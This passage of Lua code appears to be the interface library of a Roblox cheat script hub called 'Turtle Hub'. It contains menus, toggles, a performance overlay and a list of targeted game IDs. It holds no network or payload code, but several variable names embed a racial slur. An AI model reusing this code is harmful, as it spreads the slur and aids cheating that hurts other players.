		Title.Text = lib:ColorFonts(lib:ColorFonts(text,"Bold"),"White") .. " | " .. lib:ColorFonts(lib:ColorFonts((getPing() >= 1000 and lib:ColorFonts(getPing(),"Red") or getPing() >= 500 and lib:ColorFonts(getPing(),"Yellow") or lib:ColorFonts(getPing(),"White")) .. "ms (" .. math.floor((LocalPlayer:GetNetworkPing() or 0)) .. "ms) - " .. (math.round(1/v) <= 30 and lib:ColorFonts(math.round(1/v),"Yellow") or math.round(1/v) <= 10 and lib:ColorFonts(math.round(1/v),"Red") or lib:ColorFonts(math.round(1/v),"White")) .. "FPS (" .. (math.floor(workspace:GetRealPhysicsFPS()) <= 30 and lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Yellow") or math.floor(workspace:GetRealPhysicsFPS()) <= 10 and lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Red") or lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"White")) .. "/R) - " .. (lib:MemoryFormat(Stats.GetTotalMemoryUsageMb(Stats)) or "0 KB") .. " - " .. (#game:GetService("Players"):GetPlayers() or #game:GetService("Players"):GetChildren()) .. "👤 - " .. DateTime.now():FormatLocalTime("h:mm:ss A","en-us"),"Bold"),"White")
		PingLabel.Text = `Ping : {(getPing() >= 1000 and lib:ColorFonts(getPing() .. "ms","Red") or getPing() >= 500 and lib:ColorFonts(getPing() .. "ms","Yellow") or lib:ColorFonts(getPing() .. "ms","Sky Blue"))} (↑ {HighestPing}ms • ↓ {LowestPing}ms) ({math.floor((LocalPlayer:GetNetworkPing() or 0))} ms)`
		MemoryLabel.Text = `Memory Usage : {(lib:MemoryFormat(Stats.GetTotalMemoryUsageMb(Stats)) or "0 KB")} (↑ {lib:MemoryFormat(HighestMemory)} • ↓ {lib:MemoryFormat(LowestMemory)})`
		PlayersLabel.Text = `Players : {#game:GetService("Players"):GetPlayers()} (↑ {HighestPlayers} • ↓ {LowestPlayers})`
		TimesLabel.Text = `Time : {DateTime.now():FormatLocalTime("h:mm:ss A","en-us")}`
		TIMEPLAYEDLabel.Text = `Time Played : {GetTimePlayed()}`
		if getPing() > HighestPing then
			HighestPing = getPing()
		elseif getPing() < LowestPing then
			LowestPing = getPing()
		end
		if Stats.GetTotalMemoryUsageMb(Stats) > HighestMemory then
			HighestMemory = Stats.GetTotalMemoryUsageMb(Stats)
		elseif Stats.GetTotalMemoryUsageMb(Stats) < LowestMemory then
			LowestMemory = Stats.GetTotalMemoryUsageMb(Stats)
		end
		if #game:GetService("Players"):GetPlayers() > HighestPlayers then
			HighestPlayers = #game:GetService("Players"):GetPlayers()
		elseif #game:GetService("Players"):GetPlayers() < LowestPlayers then
			LowestPlayers = #game:GetService("Players"):GetPlayers()
		end
				
		FPS_BLUR.Size = UDim2.new(0,FpsLabel.TextBounds.X + 10,0,FpsLabel.TextBounds.Y + 6)
		PING_BLUR.Size = UDim2.new(0,PingLabel.TextBounds.X + 10,0,PingLabel.TextBounds.Y + 6)
		MEMORY_BLUR.Size = UDim2.new(0,MemoryLabel.TextBounds.X + 10,0,MemoryLabel.TextBounds.Y + 6)
		PLAYERS_BLUR.Size = UDim2.new(0,PlayersLabel.TextBounds.X + 10,0,PlayersLabel.TextBounds.Y + 6)
		TIMES_BLUR.Size = UDim2.new(0,TimesLabel.TextBounds.X + 10,0,TimesLabel.TextBounds.Y + 6)
		TIME_PLAYED_BLUR.Size = UDim2.new(0,TIMEPLAYEDLabel.TextBounds.X + 10,0,TIMEPLAYEDLabel.TextBounds.Y + 6)
	end)
	lib:runtime(function(v)
		FpsLabel.Text = `FPS : {(math.round(1/v) <= 30 and lib:ColorFonts(math.round(1/v),"Yellow") or math.round(1/v) <= 10 and lib:ColorFonts(math.round(1/v),"Red") or lib:ColorFonts(math.round(1/v),"White"))} (↑ {HighestFPS} • ↓ {LowestFPS}) ({(math.floor(workspace:GetRealPhysicsFPS()) <= 30 and lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Yellow") or math.floor(workspace:GetRealPhysicsFPS()) <= 10 and lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Red") or lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Sky Blue"))}/R)`
		if math.round(1/v) > HighestFPS then
			HighestFPS = math.round(1/v)
		elseif math.round(1/v) < LowestFPS then
			LowestFPS = math.round(1/v)
		end
		task.wait(1)
	end)
    end --LocalPlayer:GetNetworkPing()
	
    DragFrame.Name = "DragFrame"
    DragFrame.Parent = Main
    DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    DragFrame.BackgroundTransparency = 1.000
    DragFrame.Size = UDim2.new(0, 560, 0, 41)
	
   --[[ local OpenHideUI = Instance.new("TextButton")
    OpenHideUI.Size = UDim2.new(0.5,0,1,0)
    OpenHideUI.Position = UDim2.new(0.5,0,0,0)
    OpenHideUI.Text = "HIDE UI"
    OpenHideUI.Parent = HIDEUINIGGER
    OpenHideUI.BackgroundTransparency = 0.7
    OpenHideUI.TextTransparency = 0
    OpenHideUI.Draggable = true
    UICorner_hide.CornerRadius = UDim.new(.1,0)
    UICorner_hide.Parent = OpenHideUI
    lib:runtime(function()
		OpenHideUI.BackgroundColor3 = Color3.fromRGB(math.floor(((math.sin(workspace.DistributedGameTime/2)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime*1.5)/2)+0.5)*255))
    end)
	]]
    Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)

    MakeDraggable(DragFrame,Main)

    local uitoggled = false
    local MobileToggled = false
    UserInputService.InputBegan:Connect(function(io,p)
            if io.KeyCode == CloseBind then
                if uitoggled == false then
                    uitoggled = true
                    OpenHideUI.Text = "SHOW UI"
		    --lib:RevokeLag()
		    FpsPingFrame.Visible = true
                    Main:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
                            ui.Enabled = false
			    isGuiOpened = false
                   end)
                else
                    uitoggled = false
                    ui.Enabled = true
                    OpenHideUI.Text = "HIDE UI"
		    isGuiOpened = true
		    FpsPingFrame.Visible = false
		    --lib:RevokeLag()
                    Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
                end
            end
        end)

	local function openUI(name,state,input)
		if state == Enum.UserInputState.Begin then
			MobileToggled = not MobileToggled
			if MobileToggled == true then
				ui.Enabled = true
				isGuiOpened = true
				FpsPingFrame.Visible = false
				Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
			elseif MobileToggled == false then
				FpsPingFrame.Visible = true
				Main:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
					ui.Enabled = false
					isGuiOpened = false
				end)
			end
		end
	end

	if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
		if game.PlaceId == 12135640403 or game.PlaceId == 15502802094 or game.PlaceId == 15742087191 or game.PlaceId == 18314395469 or game.PlaceId == 4972091010 or game.PlaceId == 7092693227 or game.PlaceId == 12137249458 or game.PlaceId == 109644231059364 or game.PlaceId == 6172932937 or game.PlaceId == 13827198708 or game.PlaceId == 15694891095 or game.PlaceId == 17298248036 or game.PlaceId == 16530578419 or game.PlaceId == 17625359962 or game.PlaceId == 18126510175 or game.PlaceId == 71874690745115 or game.PlaceId == 117398147513099 or game.PlaceId == 3233893879 or game.PlaceId == 5913871729 or game.PlaceId == 11379161761 or game.PlaceId == 3214114884 then -- Anime Dungeon Fighters world 1 & 2 & 3, Evolution Simulator, Zombie Uprising, Gun Grounds FFA, Maze Simulator, Energy Assault, Pull A Sword, Combat Arena (PC & MOBILE SERVER), anime Dungeon Fighter PVP, Rivals, Bad Business
			local THHUI = Instance.new("ScreenGui")
			THHUI.Name = "VIP TURTLE HUB HIDE UI"
			THHUI.Parent = lib.Interface("hide") --game:GetService("CoreGui")
			THHUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

			local HIDEUINIGGER = Instance.new("Frame")
			HIDEUINIGGER.Size = UDim2.new(0.5,0,0.1,0) --UDim2.new(0,200,0,150)
			HIDEUINIGGER.Position = UDim2.new(0.5,0,0,0) --UDim2.new(0.5,-100,0.5,-75)
			HIDEUINIGGER.BackgroundColor3 = Color3.fromRGB(255,255,255)
			HIDEUINIGGER.Parent = THHUI
			HIDEUINIGGER.BackgroundTransparency = 1

			local OpenHideUI = Instance.new("TextButton")
			OpenHideUI.Size = UDim2.new(0.5,0,1,0)
			OpenHideUI.Position = UDim2.new(0.5,0,0,0)
  			OpenHideUI.Text = "UI KEYBINDS"
  			OpenHideUI.Parent = HIDEUINIGGER
    			OpenHideUI.BackgroundTransparency = 0.7
    			OpenHideUI.TextTransparency = 0
    			OpenHideUI.Draggable = true
   			UICorner_hide.CornerRadius = UDim.new(.1,0)
    			UICorner_hide.Parent = OpenHideUI
    			lib:runtime(function()
				OpenHideUI.BackgroundColor3 = Color3.fromRGB(math.floor(((math.sin(workspace.DistributedGameTime/2)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime*1.5)/2)+0.5)*255))
   			end)

			OpenHideUI.MouseButton1Click:Connect(function()
				openUI("",Enum.UserInputState.Begin,Vector3.new(0,0,0))
			end)
		else
			ContextActionService:BindAction("Turtle Menu",openUI,true,Enum.KeyCode.Comma)
			ContextActionService:SetImage("Turtle Menu","rbxassetid://13030062874")
			ContextActionService:SetTitle("Turtle Menu","MENU")
			ContextActionService:SetDescription("Turtle Menu","Best script in 2024! 😈")
			ContextActionService:SetPosition("Turtle Menu",UDim2.new(0.5,0,0,0))
		end
	end
	--[[OpenHideUI.MouseButton1Click:Connect(function()
		if MobileToggled == false then
			MobileToggled = true
			uitoggled = true
			OpenHideUI.Text = "SHOW UI"
			--lib:RevokeLag()
			Main:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
                            ui.Enabled = false
                        end)
		else
			MobileToggled = false 
			uitoggled = false
			ui.Enabled = true
			OpenHideUI.Text = "HIDE UI"
			--lib:RevokeLag()
			Main:TweenSize(UDim2.new(0,560,0,319),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
		end
	end)]]
	
    TabFolder.Name = "TabFolder"
    TabFolder.Parent = Main

    function lib:ChangePresetColor(toch)
        PresetColor = toch
    end
	
    function lib:Notification(texttitle, textdesc, textbtn)
        local NotificationHold = Instance.new("TextButton")
        local NotificationFrame = Instance.new("Frame")
        local OkayBtn = Instance.new("TextButton")
        local OkayBtnCorner = Instance.new("UICorner")
        local OkayBtnTitle = Instance.new("TextLabel")
        local NotificationTitle = Instance.new("TextLabel")
        local NotificationDesc = Instance.new("TextLabel")

        NotificationHold.Name = "NotificationHold"
        NotificationHold.Parent = Main
        NotificationHold.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        NotificationHold.BackgroundTransparency = 1.000
        NotificationHold.BorderSizePixel = 0
        NotificationHold.Size = UDim2.new(0, 560, 0, 319)
        NotificationHold.AutoButtonColor = false
        NotificationHold.Font = Enum.Font.SourceSans
        NotificationHold.Text = ""
        NotificationHold.TextColor3 = Color3.fromRGB(0, 0, 0)
        NotificationHold.TextSize = 14.000
        NotificationHold.RichText = true
		
        TweenService:Create(
            NotificationHold,
            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 0.7}
        ):Play()
        wait(0.4)

        NotificationFrame.Name = "NotificationFrame"
        NotificationFrame.Parent = NotificationHold
        NotificationFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        NotificationFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        NotificationFrame.BorderSizePixel = 0
        NotificationFrame.ClipsDescendants = true
        NotificationFrame.Position = UDim2.new(0.5, 0, 0.498432577, 0)

        NotificationFrame:TweenSize(
            UDim2.new(0, 164, 0, 193),
            Enum.EasingDirection.Out,
            Enum.EasingStyle.Quart,
            .6,
            true
        )

        OkayBtn.Name = "OkayBtn"
        OkayBtn.Parent = NotificationFrame
        OkayBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
        OkayBtn.Position = UDim2.new(0.0609756112, 0, 0.720207274, 0)
        OkayBtn.Size = UDim2.new(0, 144, 0, 42)
        OkayBtn.AutoButtonColor = false
        OkayBtn.Font = Enum.Font.SourceSans
        OkayBtn.Text = ""
        OkayBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        OkayBtn.TextSize = 14.000

        OkayBtnCorner.CornerRadius = UDim.new(0, 5)
        OkayBtnCorner.Name = "OkayBtnCorner"
        OkayBtnCorner.Parent = OkayBtn

        OkayBtnTitle.Name = "OkayBtnTitle"
        OkayBtnTitle.Parent = OkayBtn
        OkayBtnTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        OkayBtnTitle.BackgroundTransparency = 1.000
        OkayBtnTitle.Position = UDim2.new(0.0763888881, 0, 0, 0)
        OkayBtnTitle.Size = UDim2.new(0, 181, 0, 42)
        OkayBtnTitle.Font = Enum.Font.Gotham
        OkayBtnTitle.Text = textbtn
        OkayBtnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        OkayBtnTitle.TextSize = 14.000
        OkayBtnTitle.TextXAlignment = Enum.TextXAlignment.Left
        OkayBtnTitle.RichText = true
		
        NotificationTitle.Name = "NotificationTitle"
        NotificationTitle.Parent = NotificationFrame
        NotificationTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        NotificationTitle.BackgroundTransparency = 1.000
        NotificationTitle.Position = UDim2.new(0.0670731738, 0, 0.0829015523, 0)
        NotificationTitle.Size = UDim2.new(0, 143, 0, 26)
        NotificationTitle.Font = Enum.Font.Gotham
        NotificationTitle.Text = texttitle
        NotificationTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        NotificationTitle.TextSize = 18.000
        NotificationTitle.TextXAlignment = Enum.TextXAlignment.Left
        NotificationTitle.RichText = true
		
        NotificationDesc.Name = "NotificationDesc"
        NotificationDesc.Parent = NotificationFrame
        NotificationDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        NotificationDesc.BackgroundTransparency = 1.000
        NotificationDesc.Position = UDim2.new(0.0670000017, 0, 0.218999997, 0)
        NotificationDesc.Size = UDim2.new(0, 143, 0, 91)
        NotificationDesc.Font = Enum.Font.Gotham
        NotificationDesc.Text = textdesc
        NotificationDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
        NotificationDesc.TextSize = 15.000
        NotificationDesc.TextWrapped = true
        NotificationDesc.TextXAlignment = Enum.TextXAlignment.Left
        NotificationDesc.TextYAlignment = Enum.TextYAlignment.Top
        NotificationDesc.RichText = true
		
        OkayBtn.MouseEnter:Connect(
            function()
                TweenService:Create(
                    OkayBtn,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                ):Play()
            end
        )

        OkayBtn.MouseLeave:Connect(
            function()
                TweenService:Create(
                    OkayBtn,
                    TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
                ):Play()
            end
        )

        OkayBtn.MouseButton1Click:Connect(
            function()
                NotificationFrame:TweenSize(
                    UDim2.new(0, 0, 0, 0),
                    Enum.EasingDirection.Out,
                    Enum.EasingStyle.Quart,
                    .6,
                    true
                )

                wait(0.4)

                TweenService:Create(
                    NotificationHold,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 1}
                ):Play()

                wait(.3)

                NotificationHold:Destroy()
            end
        )
    end

    local tabhold = {}
    function tabhold:Tab(text,srgb)
        local TabBtn = Instance.new("TextButton")
        local TabTitle = Instance.new("TextLabel")
        local TabBtnIndicator = Instance.new("Frame")
        local TabBtnIndicatorCorner = Instance.new("UICorner")
        local isrgb = srgb or false
		
        TabBtn.Name = "TabBtn"
        TabBtn.Parent = TabHold
        TabBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabBtn.BackgroundTransparency = 1.000
        TabBtn.Size = UDim2.new(0, 107, 0, 21)
        TabBtn.Font = Enum.Font.SourceSans
        TabBtn.Text = ""
        TabBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        TabBtn.TextSize = 14.000

        TabTitle.Name = "TabTitle"
        TabTitle.Parent = TabBtn
        TabTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TabTitle.BackgroundTransparency = 1.000
        TabTitle.Size = UDim2.new(0, 107, 0, 21)
        TabTitle.Font = Enum.Font.Gotham
        TabTitle.Text = text
        TabTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
        TabTitle.TextSize = 14.000
        TabTitle.TextXAlignment = Enum.TextXAlignment.Left
        TabTitle.RichText = true
	if isrgb == true then
		local UIGradient = Instance.new("UIGradient")
		UIGradient.Color = lib:FormatRGB("gradient")[1]
		UIGradient.Rotation = 90
		UIGradient.Parent = TabTitle
	end
		
        TabBtnIndicator.Name = "TabBtnIndicator"
        TabBtnIndicator.Parent = TabBtn
        TabBtnIndicator.BackgroundColor3 = PresetColor
        TabBtnIndicator.BorderSizePixel = 0
        TabBtnIndicator.Position = UDim2.new(0, 0, 1, 0)
        TabBtnIndicator.Size = UDim2.new(0, 0, 0, 2)

	local Gradientindex = 1
	local gradientColor = lib:FormatRGB("gradient")
        TabBtnIndicatorCorner.Name = "TabBtnIndicatorCorner"
        TabBtnIndicatorCorner.Parent = TabBtnIndicator
        --[[
		local function tweenGradient()
    local index = 1
    while true do
        local nextIndex = (index % #colors) + 1
        local tween = TweenService:Create(uiGradient,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{Color = colors[index]})
        TweenService:Create(TabTitle.UIGradient,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{Color = gradientColor[Gradientindex]}):Play()
        tween.Completed:Wait()
        Gradientindex = (Gradientindex % #gradientColor) + 1
        wait(1)
    end
end
	]]
        lib:runtime(function()
		if isrgb == true then
			TabBtnIndicator.BackgroundColor3 = lib:FormatRGB("rgb")
		else
			TabBtnIndicator.BackgroundColor3 = PresetColor
		end
	end)

	--[[lib:runtime(function()
		if isrgb == true then
			TweenService:Create(TabTitle.UIGradient,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{Color = gradientColor[Gradientindex]}):Play()
			TweenService:Create(TabTitle.UIGradient,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{Color = gradientColor[Gradientindex]}).Completed:Wait()
			Gradientindex = (Gradientindex % #gradientColor) + 1
			wait(1)
		end
	end)]]
		
        local Tab = Instance.new("ScrollingFrame")
        local TabLayout = Instance.new("UIListLayout")

        Tab.Name = "Tab"
        Tab.Parent = TabFolder
        Tab.Active = true
        Tab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Tab.BackgroundTransparency = 1.000
        Tab.BorderSizePixel = 0
        Tab.Position = UDim2.new(0.31400001, 0, 0.147, 0)
        Tab.Size = UDim2.new(0, 373, 0, 254)
        Tab.CanvasSize = UDim2.new(0, 0, 0, 0)
        Tab.ScrollBarThickness = 3
        Tab.Visible = false

        TabLayout.Name = "TabLayout"
        TabLayout.Parent = Tab
        TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
        TabLayout.Padding = UDim.new(0,6)
		
        if fs == false then
            fs = true
            TabBtnIndicator.Size = UDim2.new(0, 13, 0, 2)
            TabTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            Tab.Visible = true
        end

        TabBtn.MouseButton1Click:Connect(
            function()
                for i, v in next,TabFolder:GetChildren() do
                    if v.Name == "Tab" then
                        v.Visible = false
                    end
                    Tab.Visible = true
                end
                for i, v in next,TabHold:GetChildren() do
                    if v.Name == "TabBtn" then
                        v.TabBtnIndicator:TweenSize(
                            UDim2.new(0, 0, 0, 2),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TabBtnIndicator:TweenSize(
                            UDim2.new(0, 13, 0, 2),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TweenService:Create(
                            v.TabTitle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {TextColor3 = Color3.fromRGB(150, 150, 150)}
                        ):Play()
                        TweenService:Create(
                            TabTitle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {TextColor3 = Color3.fromRGB(255, 255, 255)}
                        ):Play()
                    end
                end
            end
        )

        
		
        local tabcontent = {}
        function tabcontent:Button(text, callback, descToggle)
            local Button = Instance.new("TextButton")
            local ButtonCorner = Instance.new("UICorner")
            local ButtonTitle = Instance.new("TextLabel")
	    local asslabel = {}
			
            Button.Name = "Button"
            Button.Parent = Tab
            Button.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Button.Size = UDim2.new(0, 363, 0, 42)
            Button.AutoButtonColor = false
            Button.Font = Enum.Font.SourceSans
            Button.Text = ""
            Button.TextColor3 = Color3.fromRGB(0, 0, 0)
            Button.TextSize = 14.000

            ButtonCorner.CornerRadius = UDim.new(0, 5)
            ButtonCorner.Name = "ButtonCorner"
            ButtonCorner.Parent = Button

            ButtonTitle.Name = "ButtonTitle"
            ButtonTitle.Parent = Button
            ButtonTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ButtonTitle.BackgroundTransparency = 1.000
            ButtonTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            ButtonTitle.Size = UDim2.new(0, 187, 0, 42)
            ButtonTitle.Font = Enum.Font.Gotham
            ButtonTitle.Text = text
            ButtonTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ButtonTitle.TextSize = 14.000
            ButtonTitle.TextXAlignment = Enum.TextXAlignment.Left
            ButtonTitle.RichText = true
			
            local ToggleDesc = Instance.new("TextLabel")
	    ToggleDesc.Name = "ButtonDesc"
            ToggleDesc.Parent = Button
            ToggleDesc.BackgroundColor3 = Color3.fromRGB(255,255,255)
            ToggleDesc.BackgroundTransparency = 1.000
            ToggleDesc.Position = UDim2.new(0.0358126722,0,0.160,0)
            ToggleDesc.Size = UDim2.new(0,187,0,42)
            ToggleDesc.Font = Enum.Font.Gotham
            ToggleDesc.Text = ""
            ToggleDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleDesc.TextSize = 12.000
            ToggleDesc.TextXAlignment = Enum.TextXAlignment.Left
            ToggleDesc.RichText = true
	    ToggleDesc.Visible = false --["Gray"] = "rgb(128,128,128)"

	    TurtleFlags[text .. " desc"] = function(descName)
		if typeof(descName) ~= "nil" then
			ToggleDesc.Visible = true
			TweenService:Create(ButtonTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
			if typeof(descName) == "string" or typeof(descName) == "number" then
				ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
				--TweenService:Create(Toggle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.215625003,0,0.446271926,TabLayout.AbsoluteContentSize.Y)}):Play()
				if descName ~= "" then
					TweenService:Create(ButtonTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				else
					TweenService:Create(ButtonTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
				end
			else
				task.spawn(function()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts("Only accept A-Z, a-z & 0-9 not a " .. typeof(descName),TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					wait(2)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				end)
			end
		else
			TweenService:Create(ButtonTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
			TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
		end
	    end

	    TurtleFlags[text .. " desc"](descToggle)
            Button.MouseEnter:Connect(
                function()
                    TweenService:Create(
                        Button,
                        TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                    ):Play()
                end
            )

            Button.MouseLeave:Connect(
                function()
                    TweenService:Create(
                        Button,
                        TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                        {BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
                    ):Play()
                end
            )
			
	    --[[task.spawn(function()
		lib:ErrorReader(function()
			pcall(callback)
		end)
	    end)]]
			
            Button.MouseButton1Click:Connect(function()
		if server.dc == true then
			dcfunc()
		else
			lib:ErrorReader(function()
				pcall(callback)
			end)
		end
            end)

	    TurtleFlags[text .. " click"] = function()
		if server.dc == true then
			dcfunc()
		else
			lib:ErrorReader(function()
				pcall(callback)
			end)
		end
	    end
			
	    function asslabel:ClearCache()
		    Button:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
                        Button:Destroy()
                    end)
		    Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    end
			
            Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    return asslabel
        end
	
        function tabcontent:Toggle(text,default,callback,descToggle)
            local toggled = false
	    local asslabel = {}

            local Toggle = Instance.new("TextButton")
            local ToggleCorner = Instance.new("UICorner")
            local ToggleTitle = Instance.new("TextLabel")
	    local FrameToggle1 = Instance.new("Frame")
            local FrameToggle1Corner = Instance.new("UICorner")
            local FrameToggle2 = Instance.new("Frame")
            local FrameToggle2Corner = Instance.new("UICorner")
            local FrameToggle3 = Instance.new("Frame")
            local FrameToggle3Corner = Instance.new("UICorner")
            local FrameToggleCircle = Instance.new("Frame")
            local FrameToggleCircleCorner = Instance.new("UICorner")

            Toggle.Name = "Toggle"
            Toggle.Parent = Tab
            Toggle.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Toggle.Position = UDim2.new(0.215625003,0,0.446271926,0)
            Toggle.Size = UDim2.new(0,363,0,42)
            Toggle.AutoButtonColor = false
            Toggle.Font = Enum.Font.SourceSans
            Toggle.Text = ""
            Toggle.TextColor3 = Color3.fromRGB(0, 0, 0)
            Toggle.TextSize = 14.000

            ToggleCorner.CornerRadius = UDim.new(0, 5)
            ToggleCorner.Name = "ToggleCorner"
            ToggleCorner.Parent = Toggle

            ToggleTitle.Name = "ToggleTitle"
            ToggleTitle.Parent = Toggle
            ToggleTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ToggleTitle.BackgroundTransparency = 1.000
            ToggleTitle.Position = UDim2.new(0.0358126722,0,0,0)
            ToggleTitle.Size = UDim2.new(0, 187, 0, 42)
            ToggleTitle.Font = Enum.Font.Gotham
            ToggleTitle.Text = text
            ToggleTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleTitle.TextSize = 14.000
            ToggleTitle.TextXAlignment = Enum.TextXAlignment.Left
            ToggleTitle.RichText = true

	    local ToggleDesc = Instance.new("TextLabel")
	    ToggleDesc.Name = "ToggleDesc"
            ToggleDesc.Parent = Toggle
            ToggleDesc.BackgroundColor3 = Color3.fromRGB(255,255,255)
            ToggleDesc.BackgroundTransparency = 1.000
            ToggleDesc.Position = UDim2.new(0.0358126722,0,0.160,0)
            ToggleDesc.Size = UDim2.new(0,187,0,42)
            ToggleDesc.Font = Enum.Font.Gotham
            ToggleDesc.Text = ""
            ToggleDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleDesc.TextSize = 12.000
            ToggleDesc.TextXAlignment = Enum.TextXAlignment.Left
            ToggleDesc.RichText = true
	    ToggleDesc.Visible = false

	    TurtleFlags[text .. " desc"] = function(descName)
		if typeof(descName) ~= "nil" then
			ToggleDesc.Visible = true
